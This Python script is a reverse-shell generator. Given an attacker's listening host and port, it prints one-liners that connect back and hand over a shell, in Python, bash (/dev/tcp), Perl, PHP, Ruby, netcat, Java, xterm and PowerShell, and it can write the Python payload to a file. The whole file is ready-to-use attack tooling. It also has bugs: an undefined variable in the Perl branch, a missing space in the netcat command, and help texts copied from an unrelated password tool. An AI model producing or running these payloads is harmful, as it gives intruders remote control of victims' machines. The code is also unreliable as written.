#!/usr/bin/env python3


import time
import argparse
import sys
import os



class Reverse_Shell_Generator:
        def __init__(self):
            self.control()
            self.Selcet()
        def Selcet(self):
            if "python" in self.args.type:
                result = ("python3 -c "\
                          +"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\
                          +'"'+f'{self.args.LHOST}'+'",'+f'{self.args.LPORT}'\
                          +"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("+'"/bin/bash"'+')'+"'")
                if self.args.output:
                   with open(self.args.output,'w') as File_write :
                        File_write.write(result)     
                print(result)
            elif "bash" in self.args.type:
                    result=  "bash -i >& /dev/tcp/"+f'{self.args.LHOST}'+"/"+f'{self.args.LPORT}'+" 0>&1" 
                    print(result)
            elif "perl" in self.args.type:
                 result = "perl -e 'use Socket;$i="+f'{self.args.LHOST}'\
                        +";$p="+f'{self.args.LPORT}'+";socket(S,PF_INET,SOCK_STREAM,getprotobyname("\
                        +'"tcp"'+"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"+'">&S"'\
                        +");open(STDOUT,"+'">&S"'+");open(STDERR,"+'">&S"'+");exec("+'"sh -i"'+");};'"
                 print(reselt)    
            elif 'php' in self.args.type:
                  result = "php -r '$sock=fsockopen("+'"'+f'{self.args.LHOST}'\
                         +'"'+","+f'{self.args.LPORT}'+");exec("\
                         +'"/bin/sh -i <&3 >&3 2>&3"'+");'"
                  print(result) 
            elif 'ruby' in self.args.type:
                 result = "ruby -rsocket -e'f=TCPSocket.open("+'"'\
                        +f'{self.args.LHOST}'+'"'+","+f'{self.args.LPORT}'\
                        +").to_i;exec sprintf("+'"/bin/sh -i <&%d >&%d 2>&%d"'\
                        +",f,f,f)"+"'"
                 print(result)
            elif 'netcat' in self.args.type or 'nc' in self.args.type:
                 result = "nc -e /bin/sh"+f'{self.args.LHOST}'+" "+f'{self.args.LPORT}'
                 print(result)
            elif 'xterm' in self.args.type:
                 result = 'xterm -display '+f'{self.args.LHOST}'+':'+f'{self.args.LPORT}'
                 print(result)
            elif 'java' in self.args.type:
                  result = 'result = Runtime.getRuntime()'+'\n'+'process = result.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'\
                           +f'{self.args.LHOST}'+'/'+f'{self.args.LPORT}'+';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])'\
                           +'\n'+'process.waitFor()'
                  print(result)         
            elif 'powershell'  in self.args.type:
                 result = '$client = New-Object System.Net.Sockets.TCPClient("'+f'{self.args.LHOST}'+'",'+f'{self.args.LPORT}'+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'    
                 print(result)
        def control(self):    
            parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")      
            parser.add_argument("-t",'--type'     , metavar='' , action=None  ,help   ="Hash string ") 
            parser.add_argument("-i","--LHOST"    , metavar='' , action=None  ,required = True ,help   ="wordlist of passwords") 
            parser.add_argument("-p","--LPORT" , metavar='' , action=None  ,required = True ,help   ="Show the Hash Supporting  and Information")   
            parser.add_argument("-o","--output"   , metavar='' , action=None                   ,help   ="set color display off")      
         
            self.args = parser.parse_args()        
            if len(sys.argv)!=1 :
               pass
            else:
               parser.print_help()         
               exit()
if __name__=='__main__':
   Reverse_Shell_Generator()  



